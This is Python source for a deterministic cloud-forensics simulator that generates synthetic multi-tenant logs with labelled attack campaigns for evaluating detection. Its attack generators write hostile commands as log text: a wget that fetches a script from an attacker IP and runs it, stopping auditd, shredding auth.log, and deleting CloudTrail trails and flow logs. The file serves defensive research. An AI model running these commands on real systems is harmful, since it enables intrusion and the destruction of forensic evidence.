"""Multi-tenant IaaS cloud simulator with ground-truth attack campaigns.

Commercial CSP back-ends cannot be instrumented by researchers (Manral et al.,
Sec. 1), so the evaluation uses a deterministic, seeded simulator that emits
*raw* log lines in five heterogeneous formats modelled on real cloud artifacts
listed in Table 14 of the survey:

====================  =======================================  ==============
source                format modelled on                       stakeholder
====================  =======================================  ==============
``cloudtrail``        AWS CloudTrail JSON (control plane API)  service owner
``vpcflow``           AWS VPC Flow Logs v2 (space separated)   CSP network
``syslog``            RFC 3164 guest-OS syslog (local time,    virtual machine
                      no year, no zone)
``hypervisor``        libvirt/KVM host log (ISO-8601, node     CSP hypervisor
                      zone, unsynchronised clock)
``s3access``          S3 server access log                     CSP storage
====================  =======================================  ==============

Every line carries hidden ground truth (true UTC time, label, campaign id and
kill-chain step) that is *only* used for evaluation; the forensic pipeline sees
the raw text exactly as an investigator would.

Benign traffic deliberately contains confounders that resemble attacks
(forgotten passwords, nightly backup bulk downloads, legitimate admin IAM
changes, GPU batch jobs, Internet SSH scanners) so that detection is not
trivially separable.
"""

from __future__ import annotations

import json
import math
import random
from dataclasses import dataclass, field
from datetime import datetime, timezone

MONTHS = ["Jan", "Feb", "Mar", "Apr", "May", "Jun",
          "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"]

BASE_TS = datetime(2026, 1, 5, 0, 0, 0, tzinfo=timezone.utc).timestamp()

ATTACK_TYPES = ["credential_exfil", "priv_esc", "cryptomining",
                "ssh_lateral", "anti_forensics"]

MINING_POOLS = ["45.9.148.21", "45.9.148.35", "91.214.124.143"]
BACKUP_SINK = "203.0.113.50"
DR_SINK = "203.0.113.77"


@dataclass
class RawRecord:
    source: str
    line: str
    true_ts: float
    tenant: str
    label: str = "benign"
    campaign: str | None = None
    step: str | None = None


@dataclass
class VM:
    name: str
    ip: str
    node: str
    eni: str


@dataclass
class Tenant:
    name: str
    account: str
    prefix: str
    tz_offset_min: int
    users: list[str]
    admins: list[str]
    home_ip: dict[str, str]
    corp_ip: str
    vms: list[VM]
    buckets: list[str]
    keys: dict[str, list[str]] = field(default_factory=dict)


@dataclass
class Inventory:
    """Asset inventory (CMDB) an investigator obtains from the service owner."""

    accounts: dict[str, str]          # account id -> tenant
    hosts: dict[str, str]             # vm name -> tenant
    host_tz_min: dict[str, int]       # vm name -> UTC offset (minutes)
    vm_ip: dict[str, str]             # private ip -> vm name
    buckets: dict[str, str]           # bucket -> tenant
    node_clock_offset_s: dict[str, float]   # node -> measured skew (NTP audit)
    case_year: int = 2026

    def to_dict(self) -> dict:
        return self.__dict__.copy()


def _iso_z(ts: float) -> str:
    return datetime.fromtimestamp(ts, tz=timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


class CloudSimulator:
    """Generates one observation period of a shared IaaS region."""

    def __init__(self, seed: int = 7, n_tenants: int = 4, hours: float = 24.0,
                 intensity: float = 1.0, campaigns_per_type: int = 4,
                 attack_start_h: float = 6.0):
        self.rng = random.Random(seed)
        self.seed = seed
        self.hours = hours
        self.intensity = intensity
        self.campaigns_per_type = campaigns_per_type
        self.attack_start_h = attack_start_h
        self.records: list[RawRecord] = []
        self.nodes = [f"hv-node-{i}" for i in range(1, max(2, n_tenants // 2 + 2))]
        self.node_tz = {n: 60 for n in self.nodes}                     # CET hosts
        self.node_drift = {n: self.rng.uniform(-45, 45) for n in self.nodes}
        self.tenants = [self._make_tenant(i) for i in range(n_tenants)]
        self._req = 0
        self._new_vm = 0

    # ------------------------------------------------------------------ setup
    def _make_tenant(self, i: int) -> Tenant:
        r = self.rng
        letter = chr(ord("a") + i)
        tz_choices = [330, -300, 0, 60, 540, -480]
        users = [f"{n}.{letter}" for n in
                 ["alice", "bob", "carol", "dave", "erin", "frank", "grace", "heidi"]]
        admins = [users[0]]
        prefix = f"10.{i + 1}"
        vms = []
        for v in range(5):
            vms.append(VM(name=f"vm-{letter}-{v + 1}", ip=f"{prefix}.0.{10 + v}",
                          node=r.choice(self.nodes), eni=f"eni-{letter}{v:02d}{r.randrange(16**6):06x}"))
        home = {u: f"100.{64 + i}.{r.randrange(256)}.{r.randrange(1, 255)}" for u in users}
        return Tenant(name=f"tenant-{letter}", account=f"{(i + 1) * 111111111111:012d}",
                      prefix=prefix, tz_offset_min=tz_choices[i % len(tz_choices)],
                      users=users, admins=admins, home_ip=home,
                      corp_ip=f"192.0.2.{10 + i}", vms=vms,
                      buckets=[f"{letter}-prod-data", f"{letter}-logs", f"{letter}-ml-datasets"],
                      keys={u: [f"AKIA{letter.upper()}{r.randrange(16**12):012X}"] for u in users})

    def inventory(self) -> Inventory:
        hosts, tz, vmip = {}, {}, {}
        for t in self.tenants:
            for vm in t.vms:
                hosts[vm.name] = t.name
                tz[vm.name] = t.tz_offset_min
                vmip[vm.ip] = vm.name
        return Inventory(
            accounts={t.account: t.name for t in self.tenants},
            hosts=hosts, host_tz_min=tz, vm_ip=vmip,
            buckets={b: t.name for t in self.tenants for b in t.buckets},
            node_clock_offset_s=dict(self.node_drift))

    # --------------------------------------------------------------- emitters
    def _rid(self) -> str:
        self._req += 1
        return f"{self.seed:02d}{self._req:010X}"

    def _emit(self, source, line, ts, tenant, label="benign", campaign=None, step=None):
        self.records.append(RawRecord(source, line, ts, tenant, label, campaign, step))

    def ct(self, ts, t: Tenant, principal, event, ip, params=None, error=None,
           region="us-east-1", response=None, **gt):
        src = {"ConsoleLogin": "signin.amazonaws.com", "GetObject": "s3.amazonaws.com",
               "PutObject": "s3.amazonaws.com", "ListBuckets": "s3.amazonaws.com",
               "GetBucketAcl": "s3.amazonaws.com", "RunInstances": "ec2.amazonaws.com",
               "DescribeInstances": "ec2.amazonaws.com", "StopLogging": "cloudtrail.amazonaws.com",
               "DeleteTrail": "cloudtrail.amazonaws.com", "DeleteFlowLogs": "ec2.amazonaws.com",
               }.get(event, "iam.amazonaws.com" if event[:3] in ("Cre", "Att", "Lis", "Get", "Del")
                     else "sts.amazonaws.com")
        rec = {
            "eventVersion": "1.08", "eventTime": _iso_z(ts), "eventSource": src,
            "eventName": event, "awsRegion": region, "sourceIPAddress": ip,
            "userAgent": "aws-cli/2.15.0" if event != "ConsoleLogin" else "Mozilla/5.0",
            "userIdentity": {"type": "IAMUser", "accountId": t.account,
                             "arn": f"arn:aws:iam::{t.account}:user/{principal}",
                             "userName": principal,
                             "accessKeyId": t.keys.get(principal, ["ASIATEMP"])[0]},
            "requestParameters": params or {}, "requestID": self._rid(),
            "recipientAccountId": t.account,
        }
        if error:
            rec["errorCode"] = error
        if response:
            rec["responseElements"] = response
        self._emit("cloudtrail", json.dumps(rec, separators=(",", ":")), ts, t.name, **gt)

    def flow(self, ts, t: Tenant, eni, src, dst, sport, dport, nbytes, dur=60,
             action="ACCEPT", proto=6, **gt):
        pk = max(1, nbytes // 900)
        line = (f"2 {t.account} {eni} {src} {dst} {sport} {dport} {proto} {pk} {nbytes} "
                f"{int(ts)} {int(ts + dur)} {action} OK")
        self._emit("vpcflow", line, ts, t.name, **gt)

    def syslog(self, ts, t: Tenant, vm: VM, prog, msg, **gt):
        local = datetime.fromtimestamp(ts + t.tz_offset_min * 60, tz=timezone.utc)
        stamp = f"{MONTHS[local.month - 1]} {local.day:>2} {local:%H:%M:%S}"
        pid = self.rng.randrange(300, 32000)
        self._emit("syslog", f"{stamp} {vm.name} {prog}[{pid}]: {msg}", ts, t.name, **gt)

    def hyper(self, ts, node, msg, tenant="shared", **gt):
        local_ts = ts + self.node_drift[node] + self.node_tz[node] * 60
        local = datetime.fromtimestamp(local_ts, tz=timezone.utc)
        off = self.node_tz[node]
        sign = "+" if off >= 0 else "-"
        stamp = f"{local:%Y-%m-%dT%H:%M:%S}.{int(local.microsecond / 1000):03d}{sign}{abs(off) // 60:02d}:{abs(off) % 60:02d}"
        self._emit("hypervisor", f"{stamp} {node} libvirtd: {msg}", ts, tenant, **gt)

    def s3(self, ts, t: Tenant, bucket, requester, ip, op, key, status=200, nbytes=0, **gt):
        d = datetime.fromtimestamp(ts, tz=timezone.utc)
        stamp = f"{d.day:02d}/{MONTHS[d.month - 1]}/{d.year}:{d:%H:%M:%S} +0000"
        line = (f"{t.account} {bucket} [{stamp}] {ip} arn:aws:iam::{t.account}:user/{requester} "
                f"{self._rid()} {op} {key} {status} {nbytes}")
        self._emit("s3access", line, ts, t.name, **gt)

    # ----------------------------------------------------------------- benign
    def _diurnal(self, h: float) -> float:
        return 0.35 + 0.65 * max(0.0, math.sin(math.pi * ((h - 6) % 24) / 14)) if (h % 24) < 20 else 0.3

    def _benign_user_sessions(self, t: Tenant):
        r = self.rng
        end = BASE_TS + self.hours * 3600
        for u in t.users:
            n_sess = max(1, int(r.gauss(4, 1.5) * self.intensity))
            for _ in range(n_sess):
                ts = BASE_TS + r.uniform(0, self.hours * 3600)
                if r.random() > self._diurnal((ts - BASE_TS) / 3600) + 0.2:
                    continue
                ip = t.corp_ip if r.random() < 0.7 else t.home_ip[u]
                # forgotten password confounder: mostly < 5 failures
                if r.random() < 0.12:
                    for _ in range(r.choice([1, 2, 2, 3, 3, 4, 5, 6])):
                        self.ct(ts, t, u, "ConsoleLogin", ip, response={"ConsoleLogin": "Failure"},
                                error="Failed authentication")
                        ts += r.uniform(5, 40)
                self.ct(ts, t, u, "ConsoleLogin", ip, response={"ConsoleLogin": "Success"})
                for _ in range(r.randint(8, 35)):
                    ts += r.expovariate(1 / 45)
                    if ts > end:
                        break
                    ev = r.choices(["DescribeInstances", "GetObject", "PutObject", "ListBuckets",
                                    "GetCallerIdentity", "ListUsers"], [30, 35, 15, 8, 7, 5])[0]
                    b = r.choice(t.buckets)
                    if ev in ("GetObject", "PutObject"):
                        key = f"{r.choice(['reports', 'data', 'models', 'img'])}/{r.randrange(5000):05d}.bin"
                        self.ct(ts, t, u, ev, ip, {"bucketName": b, "key": key})
                        self.s3(ts + 0.3, t, b, u, ip, "REST.GET.OBJECT" if ev == "GetObject"
                                else "REST.PUT.OBJECT", key, nbytes=r.randrange(2_000, 2_000_000))
                    else:
                        self.ct(ts, t, u, ev, ip, {})
                # interactive SSH for some sessions
                if r.random() < 0.4:
                    vm = r.choice(t.vms)
                    self.syslog(ts, t, vm, "sshd", f"Accepted publickey for {u.split('.')[0]} from {ip} port {r.randrange(30000, 65000)} ssh2")
                    self.flow(ts, t, vm.eni, ip, vm.ip, r.randrange(30000, 65000), 22, r.randrange(20_000, 400_000), dur=r.randrange(60, 1800))
                    if r.random() < 0.3:
                        self.syslog(ts + 30, t, vm, "sudo", f"{u.split('.')[0]} : TTY=pts/0 ; PWD=/home/{u.split('.')[0]} ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx")

    def _benign_admin(self, t: Tenant):
        r = self.rng
        for a in t.admins:
            for _ in range(max(1, int(r.gauss(2, 1) * self.intensity))):
                ts = BASE_TS + r.uniform(0, self.hours * 3600)
                newu = f"contractor{r.randrange(100)}.{t.name[-1]}"
                self.ct(ts, t, a, "CreateUser", t.corp_ip, {"userName": newu})
                pol = r.choices(["ReadOnlyAccess", "AmazonS3ReadOnlyAccess", "AdministratorAccess"], [5, 4, 1])[0]
                self.ct(ts + 20, t, a, "AttachUserPolicy", t.corp_ip,
                        {"userName": newu, "policyArn": f"arn:aws:iam::aws:policy/{pol}"})
                if r.random() < 0.5:
                    self.ct(ts + 40, t, a, "CreateAccessKey", t.corp_ip, {"userName": newu})

    def _benign_background(self, t: Tenant):
        r = self.rng
        span = self.hours * 3600
        step = 120 / self.intensity
        # VM telemetry, web traffic, cron, hypervisor heartbeat
        for vm in t.vms:
            ts = BASE_TS + r.uniform(0, step)
            while ts < BASE_TS + span:
                peer = f"{r.randrange(11, 223)}.{r.randrange(256)}.{r.randrange(256)}.{r.randrange(1, 255)}"
                self.flow(ts, t, vm.eni, peer, vm.ip, r.randrange(1024, 65000), 443, r.randrange(500, 90_000))
                if r.random() < 0.3:
                    other = r.choice(t.vms)
                    self.flow(ts, t, vm.eni, vm.ip, other.ip, r.randrange(1024, 65000), r.choice([5432, 6379, 9100]), r.randrange(300, 20_000))
                ts += r.expovariate(1 / step)
            ts = BASE_TS + r.uniform(0, 300)
            while ts < BASE_TS + span:
                self.syslog(ts, t, vm, "CRON", "(root) CMD (/usr/local/bin/healthcheck.sh)")
                ts += 300
            ts = BASE_TS + r.uniform(0, 600)
            while ts < BASE_TS + span:
                self.hyper(ts, vm.node, f"domain {vm.name} ({t.name}) heartbeat ok cpu={r.randrange(3, 55)}% mem={r.randrange(20, 80)}%", tenant=t.name)
                ts += 600
            # Internet SSH scanners (failures only, no success)
            for _ in range(int(r.randint(3, 8) * self.intensity)):
                ts = BASE_TS + r.uniform(0, span)
                scan_ip = f"{r.choice([61, 112, 141, 167, 218])}.{r.randrange(256)}.{r.randrange(256)}.{r.randrange(1, 255)}"
                for _ in range(r.randint(1, 12)):
                    user = r.choice(["root", "admin", "test", "oracle", "ubuntu"])
                    self.syslog(ts, t, vm, "sshd", f"Failed password for invalid user {user} from {scan_ip} port {r.randrange(30000, 65000)} ssh2")
                    ts += r.uniform(1, 20)
        # nightly backup: bulk GetObject + large egress to known sink (confounder)
        for day in range(int(math.ceil(self.hours / 24))):
            ts = BASE_TS + day * 86400 + 2 * 3600 + r.uniform(0, 900)
            if ts > BASE_TS + span:
                break
            b = t.buckets[0]
            for k in range(r.randint(120, 220)):
                key = f"data/{k:05d}.bin"
                self.ct(ts, t, "backup-svc", "GetObject", BACKUP_SINK, {"bucketName": b, "key": key})
                self.s3(ts + 0.2, t, b, "backup-svc", BACKUP_SINK, "REST.GET.OBJECT", key, nbytes=r.randrange(1_000_000, 9_000_000))
                ts += r.uniform(0.5, 3)
        # travelling user confounder: forgotten password from a never-seen IP
        for _ in range(r.choice([0, 1, 1, 2])):
            ts = BASE_TS + r.uniform(self.attack_start_h * 3600, span)
            u = r.choice(t.users)
            hotel = f"{r.choice([37, 88, 151, 176])}.{r.randrange(256)}.{r.randrange(256)}.{r.randrange(1, 255)}"
            for _ in range(r.randint(5, 7)):
                self.ct(ts, t, u, "ConsoleLogin", hotel, response={"ConsoleLogin": "Failure"}, error="Failed authentication")
                ts += r.uniform(5, 30)
            self.ct(ts, t, u, "ConsoleLogin", hotel, response={"ConsoleLogin": "Success"})
            for _ in range(r.randint(3, 10)):
                ts += r.expovariate(1 / 60)
                self.ct(ts, t, u, r.choice(["DescribeInstances", "ListBuckets"]), hotel)
        # disaster-recovery drill confounder: backup pulled to a new DR site
        if r.random() < 0.3:
            ts = BASE_TS + r.uniform(self.attack_start_h * 3600, span)
            b = t.buckets[0]
            for k in r.sample(range(5000), r.randint(70, 140)):
                key = f"data/{k:05d}.bin"
                self.ct(ts, t, "backup-svc", "GetObject", DR_SINK, {"bucketName": b, "key": key})
                self.s3(ts + 0.2, t, b, "backup-svc", DR_SINK, "REST.GET.OBJECT", key, nbytes=r.randrange(1_000_000, 9_000_000))
                ts += r.uniform(0.5, 3)
        # GPU batch job confounder: legit RunInstances burst
        if r.random() < 0.7:
            ts = BASE_TS + r.uniform(0, span)
            u = r.choice(t.users[1:4])
            for _ in range(r.randint(2, 4)):
                self.ct(ts, t, u, "RunInstances", t.corp_ip, {"instanceType": "p3.2xlarge", "minCount": 1})
                ts += r.uniform(5, 30)
        for node in self.nodes:
            ts = BASE_TS + r.uniform(0, 900)
            while ts < BASE_TS + span:
                vms = [f"{vm.name}" for tt in self.tenants for vm in tt.vms if vm.node == node]
                self.hyper(ts, node, f"node stats load={r.uniform(0.2, 3.5):.2f} domains={','.join(vms)}")
                ts += 900

    # ---------------------------------------------------------------- attacks
    def _attacker_ip(self) -> str:
        r = self.rng
        return f"{r.choice([185, 198, 77, 5, 194])}.{r.randrange(256)}.{r.randrange(256)}.{r.randrange(1, 255)}"

    def _credential_exfil(self, t: Tenant, ts: float, cid: str):
        r, A = self.rng, self._attacker_ip()
        u = r.choice(t.users[1:])
        g = dict(label="credential_exfil", campaign=cid)
        for _ in range(r.randint(6, 14)):
            self.ct(ts, t, u, "ConsoleLogin", A, response={"ConsoleLogin": "Failure"},
                    error="Failed authentication", step="brute_force", **g)
            ts += r.uniform(3, 15)
        self.ct(ts, t, u, "ConsoleLogin", A, response={"ConsoleLogin": "Success"}, step="initial_access", **g)
        ts += r.uniform(30, 120)
        self.ct(ts, t, u, "ListBuckets", A, step="discovery", **g)
        for b in t.buckets:
            ts += r.uniform(5, 20)
            self.ct(ts, t, u, "GetBucketAcl", A, {"bucketName": b}, step="discovery", **g)
        b = t.buckets[0]
        for k in r.sample(range(5000), r.randint(80, 200)):
            ts += r.uniform(1, 6)
            key = f"data/{k:05d}.bin"
            self.ct(ts, t, u, "GetObject", A, {"bucketName": b, "key": key}, step="collection", **g)
            self.s3(ts + 0.2, t, b, u, A, "REST.GET.OBJECT", key, nbytes=r.randrange(2_000_000, 12_000_000),
                    step="exfiltration", **g)
        ts += r.uniform(20, 60)
        self.ct(ts, t, u, "CreateAccessKey", A, {"userName": u}, step="persistence", **g)

    def _priv_esc(self, t: Tenant, ts: float, cid: str):
        r, A = self.rng, self._attacker_ip()
        u = r.choice(t.users[1:])
        g = dict(label="priv_esc", campaign=cid)
        self.ct(ts, t, u, "GetCallerIdentity", A, step="discovery", **g)
        for ev in ["ListAttachedUserPolicies", "ListRoles", "ListUsers", "GetAccountAuthorizationDetails"]:
            ts += r.uniform(3, 20)
            self.ct(ts, t, u, ev, A, error="AccessDenied" if r.random() < 0.6 else None, step="discovery", **g)
        newu = f"svc-{r.choice(['sync', 'backup2', 'ops', 'monitor'])}{r.randrange(10)}"
        ts += r.uniform(30, 90)
        self.ct(ts, t, u, "CreateUser", A, {"userName": newu}, step="privilege_escalation", **g)
        ts += r.uniform(5, 30)
        self.ct(ts, t, u, "AttachUserPolicy", A, {"userName": newu, "policyArn": "arn:aws:iam::aws:policy/AdministratorAccess"},
                step="privilege_escalation", **g)
        ts += r.uniform(5, 30)
        self.ct(ts, t, u, "CreateAccessKey", A, {"userName": newu}, step="persistence", **g)
        t.keys[newu] = [f"AKIA{r.randrange(16**16):016X}"]
        for ev in ["ListUsers", "DescribeInstances", "ListBuckets"]:
            ts += r.uniform(60, 300)
            self.ct(ts, t, newu, ev, A, step="discovery", **g)

    def _cryptomining(self, t: Tenant, ts: float, cid: str):
        r, A = self.rng, self._attacker_ip()
        u = r.choice(t.users[1:])
        g = dict(label="cryptomining", campaign=cid)
        region = r.choice(["ap-southeast-1", "sa-east-1", "af-south-1"])
        self.ct(ts, t, u, "DescribeInstances", A, region=region, step="discovery", **g)
        pool = r.choice(MINING_POOLS)
        for _ in range(r.randint(5, 10)):
            ts += r.uniform(3, 20)
            self._new_vm += 1
            vm = VM(name=f"vm-{t.name[-1]}-x{self._new_vm}", ip=f"{t.prefix}.9.{self._new_vm % 250}",
                    node=r.choice(self.nodes), eni=f"eni-x{self._new_vm:06d}")
            self.ct(ts, t, u, "RunInstances", A, {"instanceType": "p3.8xlarge", "minCount": 1, "tag": vm.name},
                    region=region, response={"instancesSet": {"items": [{"instanceId": vm.name, "privateIpAddress": vm.ip}]}},
                    step="execution", **g)
            self.hyper(ts + 40, vm.node, f"domain {vm.name} ({t.name}) started vcpus=32", tenant=t.name, step="execution", **g)
            mt = ts + 120
            end = mt + r.uniform(1, 3) * 3600
            hi = True
            while mt < end:
                self.flow(mt, t, vm.eni, vm.ip, pool, r.randrange(30000, 60000), r.choice([3333, 4444, 14444]),
                          r.randrange(4_000, 30_000), dur=60, step="impact", **g)
                if hi:
                    self.hyper(mt, vm.node, f"domain {vm.name} ({t.name}) heartbeat ok cpu={r.randrange(96, 100)}% mem=41%",
                               tenant=t.name, step="impact", **g)
                hi = not hi
                mt += 300

    def _ssh_lateral(self, t: Tenant, ts: float, cid: str):
        r, A = self.rng, self._attacker_ip()
        g = dict(label="ssh_lateral", campaign=cid)
        vm = r.choice(t.vms)
        for _ in range(r.randint(20, 60)):
            user = r.choice(["root", "admin", "deploy", "ubuntu"])
            self.syslog(ts, t, vm, "sshd", f"Failed password for {user} from {A} port {r.randrange(30000, 65000)} ssh2",
                        step="brute_force", **g)
            self.flow(ts, t, vm.eni, A, vm.ip, r.randrange(30000, 65000), 22, r.randrange(2000, 6000), dur=5,
                      step="brute_force", **g)
            ts += r.uniform(0.5, 4)
        self.syslog(ts, t, vm, "sshd", f"Accepted password for deploy from {A} port {r.randrange(30000, 65000)} ssh2",
                    step="initial_access", **g)
        ts += r.uniform(20, 60)
        self.syslog(ts, t, vm, "sudo", f"deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/wget http://{A}/x.sh",
                    step="execution", **g)
        self.flow(ts, t, vm.eni, vm.ip, A, r.randrange(30000, 65000), 80, r.randrange(50_000, 300_000), step="execution", **g)
        ts += r.uniform(30, 90)
        others = [o for o in t.vms if o is not vm]
        for o in others:
            ts += r.uniform(1, 5)
            self.flow(ts, t, vm.eni, vm.ip, o.ip, r.randrange(30000, 65000), 22, r.randrange(1000, 4000), dur=3,
                      step="lateral_movement", **g)
        for o in r.sample(others, 2):
            ts += r.uniform(30, 120)
            self.syslog(ts, t, o, "sshd", f"Accepted publickey for deploy from {vm.ip} port {r.randrange(30000, 65000)} ssh2",
                        step="lateral_movement", **g)
            self.syslog(ts + 15, t, o, "sudo", "deploy : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash /tmp/x.sh",
                        step="execution", **g)

    def _anti_forensics(self, t: Tenant, ts: float, cid: str):
        r, A = self.rng, self._attacker_ip()
        a = t.admins[0]
        g = dict(label="anti_forensics", campaign=cid)
        self.ct(ts, t, a, "ConsoleLogin", A, response={"ConsoleLogin": "Success"}, step="initial_access", **g)
        ts += r.uniform(30, 120)
        self.ct(ts, t, a, "DescribeTrails", A, step="discovery", **g)
        ts += r.uniform(10, 40)
        self.ct(ts, t, a, "StopLogging", A, {"name": "org-trail"}, step="defense_evasion", **g)
        ts += r.uniform(10, 40)
        self.ct(ts, t, a, "DeleteFlowLogs", A, {"flowLogIds": ["fl-0a1b"]}, step="defense_evasion", **g)
        vm = r.choice(t.vms)
        ts += r.uniform(60, 200)
        self.syslog(ts, t, vm, "sshd", f"Accepted password for {a.split('.')[0]} from {A} port {r.randrange(30000, 65000)} ssh2",
                    step="initial_access", **g)
        self.syslog(ts + 20, t, vm, "sudo", f"{a.split('.')[0]} : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/usr/sbin/service auditd stop",
                    step="defense_evasion", **g)
        self.syslog(ts + 25, t, vm, "auditd", "The audit daemon is exiting.", step="defense_evasion", **g)
        self.syslog(ts + 40, t, vm, "sudo", f"{a.split('.')[0]} : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/shred -u /var/log/auth.log",
                    step="defense_evasion", **g)
        self.ct(ts + 90, t, a, "DeleteTrail", A, {"name": "org-trail"}, step="defense_evasion", **g)

    # ------------------------------------------------------------------- run
    def run(self) -> list[RawRecord]:
        for t in self.tenants:
            self._benign_user_sessions(t)
            self._benign_admin(t)
            self._benign_background(t)
        fns = {"credential_exfil": self._credential_exfil, "priv_esc": self._priv_esc,
               "cryptomining": self._cryptomining, "ssh_lateral": self._ssh_lateral,
               "anti_forensics": self._anti_forensics}
        cid = 0
        lo = BASE_TS + self.attack_start_h * 3600
        hi = BASE_TS + max(self.attack_start_h + 1, self.hours - 3) * 3600
        for atype in ATTACK_TYPES:
            for _ in range(self.campaigns_per_type):
                cid += 1
                t = self.rng.choice(self.tenants)
                fns[atype](t, self.rng.uniform(lo, hi), f"C{cid:02d}-{atype}")
        self.records.sort(key=lambda x: x.true_ts)
        return self.records
